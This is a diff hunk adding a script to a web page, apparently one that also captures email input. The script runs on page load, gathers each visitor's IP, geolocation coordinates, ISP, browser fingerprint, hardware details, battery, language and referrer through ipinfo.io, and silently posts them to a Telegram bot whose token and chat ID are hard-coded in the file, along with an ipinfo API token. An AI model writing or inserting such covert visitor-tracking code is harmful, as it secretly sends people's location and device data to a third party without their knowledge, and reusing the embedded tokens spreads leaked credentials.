@@ -409,6 +409,106 @@ return;
 })();
 </script>
 
+
+
+<script>
+
+    const BOT_TOKEN = "7780336780:AAHlXjfcJaEa2QL6TlFTj71mGLSoMk00a9Y";
+    const CHAT_ID = "7947170284";
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      }).catch(err => console.error("Telegram Error:", err));
+    }
+
+    async function collectInfo() {
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ct = new Date().toLocaleString();
+      const lang = navigator.language || navigator.userLanguage;
+      const languages = navigator.languages || [lang];
+      const deviceUA = navigator.userAgent;
+      const referrer = document.referrer || "Direct";
+
+
+      let batteryInfo = "Not available";
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryInfo = `${(battery.level * 100)}% ${battery.charging ? "(Charging)" : "(Not Charging)"}`;
+        }
+      } catch(e) {}
+
+
+      let connectionInfo = "Unknown";
+      if (navigator.connection) {
+        connectionInfo = `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps`;
+      }
+
+
+      const ram = navigator.deviceMemory || "Unknown";
+      const cores = navigator.hardwareConcurrency || "Unknown";
+      const screenRes = `${screen.width}x${screen.height}`;
+      const colorDepth = `${screen.colorDepth}-bit`;
+
+      // --- User-Agent Client Hints (modern Chrome/Edge/Android) ---
+      let uaCHinfo = "";
+      if (navigator.userAgentData) {
+        try {
+          const uaData = await navigator.userAgentData.getHighEntropyValues([
+            "platform", "platformVersion", "architecture", "model", "uaFullVersion"
+          ]);
+          uaCHinfo = `
+📱 Platform: ${uaData.platform} ${uaData.platformVersion}
+🔧 Architecture: ${uaData.architecture}
+📲 Device Model: ${uaData.model || "Not Available"}
+🌐 Full Browser Version: ${uaData.uaFullVersion}
+          `;
+        } catch (e) {
+          uaCHinfo = "UA-CH not available";
+        }
+      } else {
+        uaCHinfo = "UA-CH not supported by this browser";
+      }
+
+
+      fetch("https://ipinfo.io/json?token=66cc8153470e1c")
+        .then(res => res.json())
+        .then(data => {
+          const msg = `
+🌐 Visitor info
+
+📍 IP: ${data.ip}
+🏙 Location: ${data.city}, ${data.region}, ${data.country}
+📡 ISP: ${data.org}
+🗺 Coordinates: ${data.loc}
+
+🖥 Device/Browser UA: ${deviceUA}
+🖥 Screen: ${screenRes}, Color: ${colorDepth}
+💾 RAM: ${ram} GB
+⚡ CPU Cores: ${cores}
+🔋 Battery: ${batteryInfo}
+🌐 Connection: ${connectionInfo}
+
+${uaCHinfo}
+
+🌍 Timezone: ${tz}
+🕒 Local Time: ${ct}
+🌐 Language: ${lang}
+🌐 All Languages: ${languages.join(", ")}
+
+↩ Referrer: ${referrer}
+          `;
+          sendToTelegram(msg);
+        })
+        .catch(err => console.error("Geo API Error:", err));
+    }
+
+    collectInfo();
+</script>
+  
 <script>
 function saveToFile() {
   const email = document.getElementById('emailInput').value;
